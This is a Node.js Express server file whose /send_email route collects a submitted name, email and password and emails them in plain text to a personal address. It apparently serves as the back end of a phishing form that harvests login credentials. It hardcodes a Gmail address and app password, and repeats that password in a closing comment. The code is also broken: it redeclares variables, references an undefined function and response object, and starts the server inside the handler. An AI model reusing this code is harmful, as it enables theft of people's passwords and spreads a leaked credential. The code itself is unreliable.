var express = require('express');
var http = require('http');
var path = require('path');
var nodemailer = require('nodemailer');

const bodyParser = require('body-parser');

var app = express();
// var server = http.Server(app);
// var port = 500;
var port = process.env.PORT || 5000

// app.set("port", port);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(bodyParser.urlencoded({ extended: true }));
// app.use(express.static(path.join(__dirname, "/index.html")));

// app.get('/', function (req, response) {
//     response.sendFile(path.join(__dirname, "/index.html"))
// })

app.post("/send_email", (req, response) => {
    var name = req.body.name;
    var lastName = req.body.lastName;
    var email = req.body.email;
    var password = req.body.password;
    const { name, lastName, email, password } = req.body;
    sendEmail(name, lastName, email, password);
    res.sendStatus(200);

    app.listen(port, () => {
        console.log(`Server is running on port ${port}`);
    });

    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'andrey.kovpak.01@gmail.com',
            pass: 'ohfbxqcoqrhpvzmh',
        }
    });

    var infoUser = {
        name: name,
        lastName: lastName,
        email: email,
        password: password
    }

    var mailOptions = {
        from: 'andrey.kovpak.01@gmail.com',
        to: 'andrey.kovpak.01@icloud.com',
        subject: name,
        text: `Name: ${name}\nLast Name: ${lastName}\nEmail: ${email}\nPasssword: ${password}`
    }

    transporter.sendMail(mailOptions, function (error, info) {
        if (error) {
            console.log(error)
        } else {
            console.log("message sent" + info.response)
        }
        response.redirect("/")
    });
})

// server.listen(port, function () {
//     console.log("port: " + port)
// })

// ohfbxqcoqrhpvzmh